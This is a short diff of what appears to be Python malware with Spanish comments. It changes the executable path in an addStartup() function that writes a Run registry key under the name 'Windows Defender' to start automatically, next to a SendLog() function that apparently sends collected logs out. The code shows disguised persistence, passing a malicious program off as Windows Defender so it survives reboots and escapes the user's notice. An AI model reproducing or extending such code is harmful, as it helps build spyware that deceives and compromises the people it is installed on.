@@ -329,7 +329,7 @@ def SendLog():
             pass
         
 def addStartup():  # function =  Iniciar automaticamente
-    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefenderAdvanced.exe" # Path del Software completo
+    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefender.exe" # Path del Software completo
     name = "Windows Defender"                                                       # Nombre del StartUp
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():
